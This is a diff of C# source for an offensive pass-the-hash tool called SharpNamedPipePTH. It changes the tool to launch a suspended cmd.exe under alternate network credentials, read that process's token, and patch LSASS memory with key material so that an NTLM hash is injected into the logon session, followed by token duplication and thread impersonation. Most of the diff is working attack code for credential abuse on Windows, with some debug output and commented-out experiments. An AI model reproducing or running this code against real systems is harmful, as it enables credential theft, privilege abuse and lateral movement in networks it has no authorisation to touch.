@@ -13,12 +13,15 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 
+
 namespace SharpNamedPipePTH
 {
     static class Globals
     {
         private static readonly object lockObject = new object();
         public static IntPtr suspendedProcessHandle;
+
+        public static IntPtr suspendedProcessToken;
 
         public static int suspendedProcessId;
 
@@ -27,6 +30,14 @@ namespace SharpNamedPipePTH
             lock (lockObject)
             {
                 suspendedProcessHandle = (IntPtr)value;
+            }
+        }
+
+        public static void UpdateIntPtrToken(object value)
+        {
+            lock (lockObject)
+            {
+                suspendedProcessToken = (IntPtr)value;
             }
         }
     }
@@ -99,7 +110,7 @@ namespace SharpNamedPipePTH
 
 
 
-        public static int PassTheHash(string user, string domain, string ntlmHash = null, bool impersonate = false)
+        public static int PassTheHash(string user, string domain, IntPtr suspendedProcHandle, string ntlmHash = null, bool impersonate = false)
         {
             if (!Utility.IsElevated())
             {
@@ -242,18 +253,37 @@ namespace SharpNamedPipePTH
                     string name = WindowsIdentity.GetCurrent().Name;
                     Console.WriteLine($"Running as: {name}.");
 
+                    
+                    SharpNamedPipePTH.Win32.Natives.PROCESS_INFORMATION pInfo = new SharpNamedPipePTH.Win32.Natives.PROCESS_INFORMATION();
+                    SharpNamedPipePTH.Win32.Natives.STARTUPINFO sInfo = new SharpNamedPipePTH.Win32.Natives.STARTUPINFO();
 
-                    GetSystem();
-                    Console.WriteLine($"Opening Process by ID : {Globals.suspendedProcessId}.");
-                    IntPtr processHandle = OpenProcess(ProcessAccessFlags.All, true, Globals.suspendedProcessId);
-                    Console.WriteLine($"Handle : {processHandle}.");
-                    Console.WriteLine(Marshal.GetLastWin32Error());
-
+                    sInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
+                    SharpNamedPipePTH.Win32.Natives.LogonFlags logonFlags = SharpNamedPipePTH.Win32.Natives.LogonFlags.NetCredentialsOnly;
+                    
                     
 
-
-                    if (OpenProcessToken(processHandle, TOKEN_READ | (impersonate ? TOKEN_DUPLICATE : 0), out hToken))
+                    if (CreateProcessWithLogonW(user, "", domain, @"C:\Windows\System32\", "cmd.exe", "", CreationFlags.CREATE_SUSPENDED, ref pInfo))
                     {
+                        Console.WriteLine($"Executed cmd.exe in Process-ID '{pInfo.dwProcessId}'with impersonated token!");
+                        Console.WriteLine($"Process Handle: '{pInfo.hProcess}'");
+                    }
+                    else
+                    {
+                        Console.WriteLine("Process Creation failed");
+                        Console.WriteLine(Marshal.GetLastWin32Error());
+                    }
+
+                    //GetSystem();
+                    //Console.WriteLine($"Opening Process by ID : {Globals.suspendedProcessId}.");
+                    //Console.WriteLine($"Handle : {suspendedProcHandle}.");
+
+                    GetSystem();
+                    //hToken = Globals.suspendedProcessToken;
+                    bool test = OpenProcessToken(pInfo.hProcess, TOKEN_READ | (impersonate ? TOKEN_DUPLICATE : 0), out hToken);
+                    Console.WriteLine(test);
+                    if (hToken != IntPtr.Zero)
+                    {
+                        Console.WriteLine("[+]  | Process Token {0}", hToken);
 
                         IntPtr hTokenInformation = Marshal.AllocHGlobal(Marshal.SizeOf(tokenStats));
                         Marshal.StructureToPtr(tokenStats, hTokenInformation, false);
@@ -262,11 +292,13 @@ namespace SharpNamedPipePTH
 
                         if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenStatistics, hTokenInformation, (uint)Marshal.SizeOf(tokenStats), out retlen))
                         {
+                            Console.WriteLine("[+]  | Get Token Information");
                             tokenStats = (TOKEN_STATISTICS)Marshal.PtrToStructure(hTokenInformation, typeof(TOKEN_STATISTICS));
                             data.LogonId = tokenStats.AuthenticationId;
-
+                            Console.WriteLine("[*] Going to patch LSASS...");
+                            Console.WriteLine("Inpt values: {0}, {1}, {2}, {3}, {4}, {5}, {6}", hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey());
                             Pth_luid(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), ref data);
-
+                            Console.WriteLine("[*] Patching done!");
                             if (data.isReplaceOk)
                             {
                                 Console.WriteLine("[+] Replacing of data in the process - check!");
@@ -276,14 +308,14 @@ namespace SharpNamedPipePTH
                                     IntPtr hNewToken = IntPtr.Zero;
                                     if (DuplicateTokenEx(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, ref at, (int)SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, (int)TOKEN_TYPE.TokenImpersonation, ref hNewToken))
                                     {
-                                        if (SetThreadToken(IntPtr.Zero, hNewToken))
+                                        /*if (SetThreadToken(ref IntPtr.Zero, hNewToken))
                                             Console.WriteLine("[*] ** Token Impersonation **");
                                         else
                                         {
                                             Console.WriteLine("[x] Error SetThreadToken");
                                             return 1;
                                         }
-                                        CloseHandle(hNewToken);
+                                        CloseHandle(hNewToken);*/
                                     }
                                     else
                                     {
@@ -291,13 +323,60 @@ namespace SharpNamedPipePTH
                                         return 1;
                                     }
 
-                                    NtTerminateProcess(processHandle, (uint)NTSTATUS.Success);
+                                    NtTerminateProcess(suspendedProcHandle, (uint)NTSTATUS.Success);
                                 }
                                 else
-                                    return 0;//NtResumeProcess(processHandle);
+                                {
+                                    
+                                    //IntPtr newToken = Globals.suspendedProcessToken;
+                                    Console.WriteLine("[*] Setting Thread token as impersonated user...");
+                                    // open with all_access
+                                    //NtResumeProcess(pInfo.hProcess);
+                                    SECURITY_ATTRIBUTES at = new SECURITY_ATTRIBUTES();
+                                    IntPtr hNewToken = IntPtr.Zero;
+                                    if (DuplicateTokenEx(Globals.suspendedProcessToken, TOKEN_QUERY | TOKEN_IMPERSONATE, ref at, (int)SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, (int)TOKEN_TYPE.TokenImpersonation, ref hNewToken))
+                                    {
+                                        IntPtr newThread = OpenThread(ThreadAccess.THREAD_ALL_ACCESS, false, (uint)pInfo.dwThreadId);
+                                        if (newThread == IntPtr.Zero)
+                                        {
+                                            Console.WriteLine("OpenThread failed");
+                                            return 1;
+                                        }
+                                        Console.WriteLine("[*] ...");
+                                        // As SetThreadtoken required a pHANDLE and OpenThread returns a HANDLE only, we need to generate a new var with is a pointer to the HANDLE
+                                        //IntPtr newThreadHandle = ref newThread;
+                                        try { 
+                                        if (SetThreadToken(ref newThread, hNewToken))
+                                        {
+                                            Console.WriteLine("Set Thread Token Success");
+                                        }
+                                        else
+                                        {
+                                            Console.WriteLine("Set Thread Token failed");
+                                        }
+                                        }
+                                        catch
+                                        {
+                                            Console.WriteLine("Set Thread Token failed");
+                                            Console.WriteLine(Marshal.GetLastWin32Error());
+                                        }
+
+
+                                    }
+                                    else
+                                    {
+                                        Console.WriteLine("[-] DuplicateTokenEx failed");
+                                        Console.WriteLine(Marshal.GetLastWin32Error());
+
+                                    }
+                                    //NtResumeProcess(pInfo.hProcess);
+
+                                    return 0;//NtResumeProcess(suspendedProcHandle);
+
+                                }
                             }
                             else
-                                NtTerminateProcess(processHandle, (uint)NTSTATUS.ProcessIsTerminating);
+                                NtTerminateProcess(suspendedProcHandle, (uint)NTSTATUS.ProcessIsTerminating);
 
                         }
                         else
@@ -333,6 +412,23 @@ namespace SharpNamedPipePTH
             }
 
             return 0;
+        }
+
+        public static bool CreateProcessWithLogonW(string username, string password, string domain, string path, string binary, string arguments, CreationFlags cf, ref PROCESS_INFORMATION processInformation)
+        {
+
+            STARTUPINFO startupInfo = new STARTUPINFO();
+            startupInfo.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
+
+            processInformation = new PROCESS_INFORMATION();
+
+            if (!Win32.Natives.CreateProcessWithLogonW(username, domain, password,
+                LogonFlags.NetCredentialsOnly, path + binary, path + binary + " " + arguments, cf, 0, path, ref startupInfo, out processInformation))
+            {
+                return false;
+            }
+
+            return true;
         }
         private static void Pth_luid(IntPtr hProcess, IntPtr lsasrvMem, IntPtr kerberos, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, ref SEKURLSA_PTH_DATA data)
         {
